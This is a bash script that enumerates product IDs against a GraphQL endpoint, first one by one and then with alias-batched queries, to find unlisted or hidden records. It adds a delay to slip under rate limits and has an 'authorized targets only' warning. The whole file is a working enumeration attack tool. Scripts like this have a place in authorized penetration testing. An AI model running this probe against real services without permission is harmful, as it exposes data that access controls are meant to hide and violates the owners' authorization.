#!/usr/bin/env bash
# graphql_id_probe.sh
# Usage:
#   ./graphql_id_probe.sh <ENDPOINT> <START_ID> <END_ID> [AUTH_HEADER] [DELAY_SECONDS]
#
# Example:
#   ./graphql_id_probe.sh https://target.example.com/graphql 1 50 "Authorization: Bearer TOKEN" 0.5
#
# नोट: AUTH_HEADER optional है; पास करने पर उसे curl में शामिल किया जाएगा।
#       DELAY_SECONDS optional है, default 0.5 सेकंड है ताकि rate-limit कम लगे।
#
# WARNING: केवल authorized/testing targets पर ही चलाएं।

ENDPOINT="$1"
START_ID="$2"
END_ID="$3"
AUTH_HEADER="$4"
DELAY="${5:-0.5}"   # default delay 0.5 sec

if [[ -z "$ENDPOINT" || -z "$START_ID" || -z "$END_ID" ]]; then
  cat <<EOF
Usage: $0 <ENDPOINT> <START_ID> <END_ID> [AUTH_HEADER] [DELAY_SECONDS]

Example:
  $0 https://target.example.com/graphql 1 50 "Authorization: Bearer eyJ..." 0.5

Note: AUTH_HEADER should be quoted exactly as: "Authorization: Bearer TOKEN"
EOF
  exit 1
fi

# Simple GraphQL query (variable-based) to fetch product by ID.
read -r -d '' QUERY_VARIABLE <<'GRAPHQL'
query getProductWithVar($id: ID!) {
  product(id: $id) {
    id
    name
    listed
    # add other fields to check here if desired:
    # price
    # secretNotes
  }
}
GRAPHQL

# Function to probe using variable-based query
probe_with_variable() {
  local id="$1"
  # build JSON payload (escape newlines)
  payload=$(printf '{"query": %s, "variables": {"id": %s}}' "$(jq -Rs . <<<"$QUERY_VARIABLE")" "$(jq -Rn --arg v "$id" '$v')")

  # curl options
  headers=(-H "Content-Type: application/json")
  if [[ -n "$AUTH_HEADER" ]]; then
    headers+=(-H "$AUTH_HEADER")
  fi

  # send request
  http_response=$(curl -sS -w "\n%{http_code}" "${headers[@]}" -X POST "$ENDPOINT" -d "$payload")
  body=$(printf "%s\n" "$http_response" | sed '$d')
  status=$(printf "%s\n" "$http_response" | tail -n1)

  echo "=== ID: $id  (HTTP $status) ==="
  # print a compact summary: if "data" has "product" not null
  if printf "%s" "$body" | grep -q '"product":[^n]'; then
    echo "$body" | sed -n '1,10p'
  else
    # print first 3 lines (likely error or empty)
    echo "$body" | sed -n '1,3p'
  fi
  echo

  sleep "$DELAY"
}

# Function to probe using alias-batch (3 IDs per single request)
probe_with_alias_batch() {
  local id1="$1"; local id2="$2"; local id3="$3"
  # build a small alias query inline
  read -r -d '' ALIAS_Q <<GRAPHQL
query {
  p1: product(id: "$id1") { id name listed }
  p2: product(id: "$id2") { id name listed }
  p3: product(id: "$id3") { id name listed }
}
GRAPHQL

  payload=$(jq -n --arg q "$ALIAS_Q" '{"query":$q}')
  headers=(-H "Content-Type: application/json")
  if [[ -n "$AUTH_HEADER" ]]; then
    headers+=(-H "$AUTH_HEADER")
  fi

  http_response=$(curl -sS -w "\n%{http_code}" "${headers[@]}" -X POST "$ENDPOINT" -d "$payload")
  body=$(printf "%s\n" "$http_response" | sed '$d')
  status=$(printf "%s\n" "$http_response" | tail -n1)

  echo "=== ALIAS BATCH IDs: $id1, $id2, $id3  (HTTP $status) ==="
  echo "$body" | sed -n '1,12p'
  echo

  sleep "$DELAY"
}

# Check prerequisites: jq required for safe JSON construction
if ! command -v jq >/dev/null 2>&1; then
  echo "ERROR: This script uses 'jq' to build JSON payloads safely. Install jq and re-run."
  echo "On Debian/Ubuntu: sudo apt-get install -y jq"
  exit 2
fi

echo "Starting GraphQL ID probe: endpoint=$ENDPOINT, ids=$START_ID..$END_ID, delay=${DELAY}s"
echo "Press Ctrl+C to stop."

# Main loop: first probe individually (variable-based)
for (( id=START_ID; id<=END_ID; id++ )); do
  probe_with_variable "$id"
done

# After individual probes, do alias batching in groups of 3 to show batching technique
echo "Now performing alias-batch probes (groups of 3)..."
i="$START_ID"
while (( i <= END_ID )); do
  a="$i"; ((i++))
  b="$i"; ((i++))
  c="$i"; ((i++))
  probe_with_alias_batch "$a" "$b" "$c"
done

echo "Done."
